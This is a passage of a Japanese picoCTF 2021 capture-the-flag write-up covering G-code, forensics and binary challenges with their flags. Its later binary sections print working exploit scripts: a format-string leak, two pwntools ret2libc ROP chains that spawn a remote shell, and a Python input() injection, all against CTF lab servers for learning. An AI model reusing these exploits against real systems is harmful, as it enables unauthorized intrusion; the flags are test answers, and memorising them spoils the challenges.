Flag: `picoCTF{1n_7h3_|<3y_of_54ef6292}`




<br /><br />
<br /><br />
## [Reverse]: speeds and feeds (50 points)
- - -
### Challenge
> There is something on my shop network running at nc mercury.picoctf.net 7032, but I can't tell what it is. Can you?
<br /><br />
Hint: What language does a CNC machine use?

<pre>
$ nc mercury.picoctf.net 7032
G17 G21 G40 G90 G64 P0.003 F50
G0Z0.1
G0Z0.1
G0X0.8276Y3.8621
:
(長いので省略)
:
</pre>

<br />
### Solution
G-codeっていうやつらしいです。

以下のサイトを使いました。<br />

https://ncviewer.com/

<img src="https://captureamerica.github.io/writeups/img/picoctf_2021_Gcode.png" alt="picoctf_2021_Gcode.png">

<br />

Flag: `picoCTF{num3r1cal_c0ntr0l_a067637b}`




<br /><br />
<br /><br />
## [Reverse]: Shop (50 points)
- - -
### Challenge
> Best Stuff - Cheap Stuff, Buy Buy Buy... Store Instance: source. The shop is open for business at nc mercury.picoctf.net 34938.
<br /><br />
Hint: Always check edge cases when programming


<br />
### Solution
売るときにマイナス値を指定するとお金が増えます。

<pre>
$ nc mercury.picoctf.net 34938
Welcome to the market!
=====================
You have 40 coins
	Item		Price	Count
(0) Quiet Quiches	10	12
(1) Average Apple	15	8
(2) Fruitful Flag	100	1
(3) Sell an Item
(4) Exit
Choose an option:
0
How many do you want to buy?
-6
You have 100 coins
	Item		Price	Count
(0) Quiet Quiches	10	18
(1) Average Apple	15	8
(2) Fruitful Flag	100	1
(3) Sell an Item
(4) Exit
Choose an option:
2
How many do you want to buy?
1
Flag is:  [112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 98 97 54 98 56 99 100 102 125]
</pre>

<br />

文字に変換。
<pre>
$ python -c 'print("".join([chr(int(x)) for x in "112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 98 97 54 98 56 99 100 102 125".split()]))'
picoCTF{b4d_brogrammer_ba6b8cdf}
</pre>

<br />

Flag: `picoCTF{b4d_brogrammer_ba6b8cdf}`



<br /><br />
<br /><br />
## [Forensics]: Information (10 points)
- - -
### Challenge
> Files can always be changed in a secret way. Can you find the flag? cat.jpg

<br />
### Solution

<pre>
=== exiftool ===
ExifTool Version Number         : 12.00
File Name                       : cat.jpg
Directory                       : .
File Size                       : 858 kB
File Modification Date/Time     : 2021:03:17 09:15:41+09:00
File Access Date/Time           : 2021:03:17 09:24:53+09:00
File Inode Change Date/Time     : 2021:03:17 09:15:47+09:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Current IPTC Digest             : 7a78f3d9cfb1ce42ab5a3aa30573d617
Copyright Notice                : PicoCTF
Application Record Version      : 4
XMP Toolkit                     : Image::ExifTool 10.80
License                         : cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9
Rights                          : PicoCTF
Image Width                     : 2560
Image Height                    : 1598
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2560x1598
Megapixels                      : 4.1
</pre>

cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9 を Base64 decode します。

<br />

Flag: `picoCTF{the_m3tadata_1s_modified}`




<br /><br />
<br /><br />
## [Forensics]: Matryoshka doll (30 points)
- - -
### Challenge
> Matryoshka dolls are a set of wooden dolls of decreasing size placed one inside another. What's the final one? Image: this

<br />
### Solution
foremostとzipを根気よく繰り返すだけです。

<br />

Flag: `picoCTF{e3f378fe6c1ea7f6bc5ac2c3d6801c1f}`




<br /><br />
<br /><br />
## [Forensics]: Wireshark doo dooo do doo... (50 points)
- - -
### Challenge
> Can you find the flag? shark1.pcapng.

<br />
### Solution
tcp.stream eq 5 に以下が見つかります。

`Gur synt vf cvpbPGS{c33xno00_1_f33_h_qrnqorrs}`

<br />
rot13すると、フラグが取れます。

`The flag is picoCTF{p33kab00_1_s33_u_deadbeef}`

<br />

Flag: `picoCTF{p33kab00_1_s33_u_deadbeef}`



<br /><br />
<br /><br />
## [Forensics]: MacroHard WeakEdge (60 points)
- - -
### Challenge
> I've hidden a flag in this file. Can you find it? Forensics is fun.pptm

<br />
### Solution
fun.pptm を zip として解凍すると、以下が見つかります。
<pre>
Forensics_is_fun/ppt/slideMasters/hidden
Z m x h Z z o g c G l j b 0 N U R n t E M W R f d V 9 r b j B 3 X 3 B w d H N f c l 9 6 M X A 1 f Q
</pre>

<br />
<pre>
$ echo "Z m x h Z z o g c G l j b 0 N U R n t E M W R f d V 9 r b j B 3 X 3 B w d H N f c l 9 6 M X A 1 f Q" | tr -d " " | base64 -d
flag: picoCTF{D1d_u_kn0w_ppts_r_z1p5}
</pre>

<br />

Flag: `picoCTF{D1d_u_kn0w_ppts_r_z1p5}`




<br /><br />
<br /><br />
## [Forensics]: Trivial Flag Transfer Protocol (90 points)
- - -
### Challenge
> Figure out how they moved the flag.
<br /><br />
Hint: What are some other ways to hide data?


<br />
### Solution
Wiresharkでtftp objectをexportします。

<pre>
$ file *
instructions.txt: ASCII text
picture1.bmp:     PC bitmap, Windows 3.x format, 605 x 454 x 24, image size 824464, resolution 5669 x 5669 px/m, cbSize 824518, bits offset 54
picture2.bmp:     data
picture3.bmp:     data
plan:             ASCII text
program.deb:      Debian binary package (format 2.0), with control.tar.gz, data compression xz
</pre>

<br />

- instructions.txt
<pre>
GSGCQBRFAGRAPELCGBHEGENSSVPFBJRZHFGQVFTHVFRBHESYNTGENAFSRE.SVTHERBHGNJNLGBUVQRGURSYNTNAQVJVYYPURPXONPXSBEGURCYNA
</pre>

- plan
<pre>
VHFRQGURCEBTENZNAQUVQVGJVGU-QHRQVYVTRAPR.PURPXBHGGURCUBGBF
</pre>

<br />
これらは、rot13すると、以下のような英語の文章になります。

<pre>
TFTP DOESNT ENCRYPT OUR TRAFFIC SO WE MUST DISGUISE OUR FLAG TRANSFER. FIGURE OUT AWAY TO HIDE THE FLAG AND I WILL CHECK BACK FOR THE PLAN
I USED THE PROGRAM AND HID IT WITH-DUE DILIGENCE. CHECK OUT THE PHOTOS
</pre>

<br />

- program.deb

以下のように解凍できます。中身は、steghideでした。
<pre>
$ ar vx program.deb
</pre>

<br />

<pre>
$ steghide extract -p 'DUEDILIGENCE' -sf picture3.bmp 
wrote extracted data to "flag.txt".

$ cat flag.txt
picoCTF{h1dd3n_1n_pLa1n_51GHT_18375919}
</pre>

<br />

Flag: `picoCTF{h1dd3n_1n_pLa1n_51GHT_18375919}`




<br /><br />
<br /><br />
## [Forensics]: Wireshark twoo twooo two twoo... (100 points)
- - -
### Challenge
> Can you find the flag? shark2.pcapng.
<br /><br />
Hint1: Did you really find _the_ flag?
<br /><br />
Hint2: Look for traffic that seems suspicious.

<br />
### Solution
DNS Queryが明らかに怪しいです。

問い合わせ先のIPは2つあって、一つは8.8.8.8。もう一つは18.217.1.57。

まずは、Wiresharkで、`dns and ip.addr==18.217.1.57`でフィルターして一旦別ファイルとして保存しておきます。

<pre>
$ tshark -r shark2_dns_18.217.1.57.pcapng -Y "dns" -T fields -e "dns.qry.name" | cut -d. -f1 | uniq | tr -d "\n" | base64 -d ; echo
picoCTF{dns_3xf1l_ftw_deadbeef}
</pre>

<br />

Flag: `picoCTF{dns_3xf1l_ftw_deadbeef}`



<br /><br />
<br /><br />
## [Forensics]: Disk, disk, sleuth! (110 points)
- - -
### Challenge
> Use `srch_strings` from the sleuthkit and some terminal-fu to find a flag in this disk image: dds1-alpine.flag.img.gz

<br />
### Solution
stringsで解けました。

<br />

Flag: `picoCTF{f0r3ns1c4t0r_n30phyt3_ad5c96c0}`



<br /><br />
<br /><br />
## [Forensics]: Disk, disk, sleuth! II (130 points)
- - -
### Challenge
> All we know is the file with the flag is named `down-at-the-bottom.txt`... Disk image: dds2-alpine.flag.img.gz
<br /><br />
Hint1: The sleuthkit has some great tools for this challenge as well.
<br /><br />
Hint2: Sleuthkit docs here are so helpful: TSK Tool Overview http://wiki.sleuthkit.org/index.php?title=TSK_Tool_Overview
<br /><br />
Hint3: This disk can also be booted with qemu!


<br />
### Solution
以下のSANSのページがとても参考になりました。

https://www.sans.org/blog/using-image-offsets/

<pre>
$ fsstat -o 2048 dds2-alpine.flag.img 
FILE SYSTEM INFORMATION
--------------------------------------------
File System Type: Ext3   <--- !!!
Volume Name: 
Volume ID: dc53a3bb0ae739a5164c89db56bbb12f
:


$ mmls dds2-alpine.flag.img 
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0000262143   0000260096   Linux (0x83)


$ expr 2048 \* 512
1048576


$ sudo mount -t ext3 -o ro,loop,offset=1048576 dds2-alpine.flag.img /mnt/test/


$ cd /mnt/test


$ sudo find . -name down-at-the-bottom.txt
./root/down-at-the-bottom.txt
</pre>

<br />

Flag: `picoCTF{f0r3ns1c4t0r_n0v1c3_69ab1dc8}`




<br /><br />
<br /><br />
## [Binary]: What's your input? (150 points)
- - -
### Challenge
> We'd like to get your input on a couple things. Think you can answer my questions correctly? in.py nc mercury.picoctf.net 61858.
<br /><br />
Hint: What version of python am I running?

<br />
### Solution
`open('flag').read()` で解けました。

<br />

Flag: `picoCTF{v4lua4bl3_1npu7_7607377}`



<br /><br />
<br /><br />
<img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
<br />
ここから下はイベント終了後に行った復習です。


<br /><br />
<br /><br />
## [Binary]: Stonks (20 points)
- - -
### Challenge
> I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure!
<br /><br />
Hint: Okay, maybe I'd believe you if you find my API key.

Attachment:

- vuln.c


<br />
### Solution
malloc()とかfree()とかあったので、double-freeとかそこら辺かと思ってスルーしてたんですけど、書式文字列攻撃（Format string bug）でしたね。

{{< highlight c "linenos=table,hl_lines=32" >}}
int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}
{{< / highlight >}}

<br />

まずは、繋いでみて動作を確認します。

<pre>
$ nc mercury.picoctf.net 53437
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Buying stonks with token:
AAAA0x9c62450.0x804b000.0x80489c3.0xf7fadd80.0xffffffff.0x1.0x9c60160.0xf7fbb110.0xf7faddc7.(nil).0x9c61180.0x1.0x9c62430.0x9c62450.0x6f636970.0x7b465443.0x306c5f49.0x345f7435.0x6d5f6c6c.0x306d5f79.0x5f79336e.0x34636462.0x61653532.0xffd5007d.0xf7fe8af8.0xf7fbb440.0x70bab900.0x1.(nil).0xf7e4abe9.0xf7fbc0c0.0xf7fad5c0.0xf7fad000.0xffd54508.0xf7e3b58d.0xf7fad5c0.0x8048eca
Portfolio as of Sun May 30 02:45:13 UTC 2021
</pre>

<br />

書いたコード：

```Python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
context.log_level = 'critical'

host, port = 'mercury.picoctf.net', 53437

for i in range(15,25):
    s = remote(host, port)
    s.recvuntil('2) View my portfolio')
    s.sendline('1')
    s.recvuntil('What is your API token?\n')
    s.sendline('%' + str(i) + '$p')
    s.recvuntil('Buying stonks with token:\n')
    response = s.recvline()
    try:
        if "0x" in response:
            r = response.rstrip() # To remove '\n'
            # print(r)
            sys.stdout.write(p32(int(r,16)))
    except:
        print("{}".format("error"))
        pass
    s.close()
print()
```

<br />
実行結果：

<pre>
$ ./stonks_solve.py
picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}\x00\xff()
</pre>


<br />

Flag: `picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}`



<br /><br />
<br /><br />
## [Binary]: Here's a LIBC (90 points)
- - -
### Challenge
> I am once again asking for you to pwn this binary.
<br /><br />
Hint: PWNTools has a lot of useful features for getting offsets.

Attachment:

- vuln (ELF 64bit)
- libc.so.6
- Makefile


<br />
### Solution

まずは、Ghidraでコードを確認します。

main() では大したことをやっていないので、省略します。以下の do_stuff() がキーになる箇所です。

```C
void do_stuff(void)

{
  char cVar1;
  undefined local_89;
  char local_88 [112];
  undefined8 local_18;
  ulong local_10;
  
  local_18 = 0;
  __isoc99_scanf("%[^\n]",local_88);
  __isoc99_scanf(&DAT_0040093a,&local_89);
  local_10 = 0;
  while (local_10 < 100) {
    cVar1 = convert_case((int)local_88[local_10],local_10,local_10);
    local_88[local_10] = cVar1;
    local_10 = local_10 + 1;
  }
  puts(local_88);
  return;
}
```

<br />
checksecも確認。

<pre>
$ checksec vuln
[*] '/home/captureamerica/OneDrive/CTF/picoCTF_2021/Binary/Heres_a_libc/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  './'
</pre>

<br />
実際に繋いでみて、動作確認。入力した文字列を所々大文字にして表示するようです。

<pre>
$ nc mercury.picoctf.net 49464
WeLcOmE To mY EcHo sErVeR!
hoge
HoGe
fuga
FuGa
</pre>

<br />
まずはオフセットをゲットしようと思ったんですが、Kaliではもらったバイナリが動きませんでした。

<pre>
$ ./vuln
Segmentation fault
</pre>

ということで、gdbも当然うごかなかったです。

<br />

ちょっとズルして、他のwriteupから136バイトなのを確認。

<br />

書いたコード (その１)

{{< highlight c "linenos=table,hl_lines=36" >}}
#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
context(os='linux', arch='amd64')
context.log_level = 'critical'

host, port = 'mercury.picoctf.net', 49464
s = remote(host, port)
elf = ELF('./vuln')

ret = next(elf.search(asm('ret')))
pop_rdi = next(elf.search(asm('pop rdi; ret')))
got_puts = elf.got["puts"]
plt_puts = elf.plt["puts"]
addr_main = elf.symbols["main"]

libc = ELF('./libc.so.6')
off_puts = libc.symbols["puts"]

bufsize = 112 + 24
payload = "A" * bufsize
payload += p64(pop_rdi)
payload += p64(got_puts)
payload += p64(plt_puts)
payload += p64(addr_main)      # return to main
s.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n",payload)
s.recvuntil('\n')

libc_puts = u64(s.recv(6) + "\x00\x00")
libc_base = libc_puts - off_puts
libc.address = libc_base
print hex(libc_base)

payload = "A" * bufsize
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').next())
payload += p64(libc.sym.system)
    
s.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n",payload)
s.recvuntil('\n')
s.interactive()	
{{< / highlight >}}


<br />
ハイライト部分でretを入れているのは、おそらく16バイトアラインメントです。

{{% admonition quote "quote" %}}
ret命令を一度呼び出しスタックを8バイトずらせば、system関数を呼び出しても動作します。（Kusanoさんの「例題pwnable」より）
{{% /admonition %}}

<br />

書いたコード (その２)

```Python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
context(os='linux', arch='amd64')
context.log_level = 'critical'

elf = ELF('./vuln')
context.binary = elf

s = remote('mercury.picoctf.net', 49464)

rop = ROP(elf)
rop.puts(elf.got.puts)
rop.main()
print(rop.dump())
s.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n", b'A'*136 + rop.chain())
s.recvuntil('\n')
puts = u64(s.recvline().rstrip().ljust(8, b"\x00"))
print('puts: %x' % puts)
libc = ELF('./libc.so.6')
libc.address = puts - libc.symbols.puts

rop = ROP(libc)
rop.execv(next(libc.search(b'/bin/sh')), 0)
print(rop.dump())
s.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n", b'A'*136 + rop.chain())
s.recvuntil('\n')
s.interactive()	
```

<br />

動作結果：

<pre>
$ ./heresalibc_solve.py
0x7fa997cbb000
$ ls
flag.txt
libc.so.6
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{1_<3_sm4sh_st4cking_37b2dd6c2acb572a}
</pre>

<br />

Flag: `picoCTF{1_<3_sm4sh_st4cking_37b2dd6c2acb572a}`


<br />




<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />
